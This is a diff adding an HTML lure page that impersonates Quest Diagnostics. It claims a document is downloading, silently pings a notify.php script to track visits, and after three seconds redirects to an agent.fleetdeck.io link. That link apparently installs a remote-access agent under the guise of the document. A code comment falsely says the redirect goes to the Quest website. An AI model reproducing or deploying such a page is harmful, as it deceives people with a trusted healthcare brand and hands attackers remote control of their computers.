@@ -1,0 +1,64 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        .logo {
+            max-width: 400px;
+            margin-bottom: 40px;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #0077C8;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            margin-top: 30px;
+            color: #333;
+            font-size: 18px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<script>
+  fetch('notify.php', {cache: 'no-cache', mode: 'no-cors'}).catch(() => {});
+</script>
+    <img src="https://tse3.mm.bing.net/th/id/OIP.OgBTo34KW9_1KsmPhej7vAHaEK?r=0&pid=Api&h=220&P=0" 
+         alt="Quest Diagnostics Logo" class="logo" 
+         onerror="this.src='https://via.placeholder.com/400x150/0077C8/FFFFFF?text=Quest+Diagnostics';">
+    
+    <div class="spinner"></div>
+    
+    <p class="message">Loading... Your document has been prepared and will download automatically.</p>
+
+    <script>
+        // Redirect to Quest Diagnostics website after 3 seconds
+        setTimeout(function() {
+            window.location.href = "https://agent.fleetdeck.io/Hg6DgUUzivKn1EXZvxCjam?win";
+        }, 3000);
+    </script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"3dd2337486d647d5909f7dbb8b59962b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
